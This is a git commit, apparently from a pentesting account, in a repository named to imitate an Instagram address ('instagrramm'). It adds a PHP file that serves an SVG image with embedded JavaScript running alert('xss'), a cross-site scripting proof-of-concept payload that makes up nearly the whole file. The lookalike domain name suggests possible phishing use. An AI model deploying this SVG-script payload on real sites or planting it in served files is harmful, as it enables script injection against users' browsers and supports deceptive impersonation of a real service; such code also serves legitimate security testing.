d41c7d381ebefc9ad965e2fef617bdaa17b29c7b
www-instagrramm-com-post <hasimpentest@gmail.com>
2026-02-27 10:51:15 +0700

    Update and rename index.html to index.php

---
+++ index.php
@@ -0,0 +1,16 @@
+<?php
+// pastikan tidak ada whitespace/output sebelum header
+header('Content-Type: image/svg+xml');
+
+// kirim konten SVG
+echo '<?xml version="1.0" standalone="no"?>';
+?>
+
+
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert('xss');
+   </script>
+</svg>
